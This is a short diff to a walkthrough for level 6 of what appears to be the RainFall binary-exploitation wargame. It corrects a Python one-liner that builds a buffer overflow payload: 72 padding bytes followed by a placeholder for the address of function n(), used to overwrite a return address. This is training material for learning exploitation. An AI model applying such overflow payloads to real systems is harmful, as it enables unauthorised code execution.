@@ -53,7 +53,7 @@ To exploit the program:
 * We need: `padding (72 bytes) + address of n()`
 
 ```bash
-python -c 'print "A" * 72 + "add de n"
+python -c 'print "A" * 72 + "add de n"'
 ```
 
 This overwrites the return address with the address of `n()`.
@@ -85,6 +85,7 @@ level6@RainFall:~$
 ---
 
 **End of Level 6 Walkthrough**
+
 
 
 
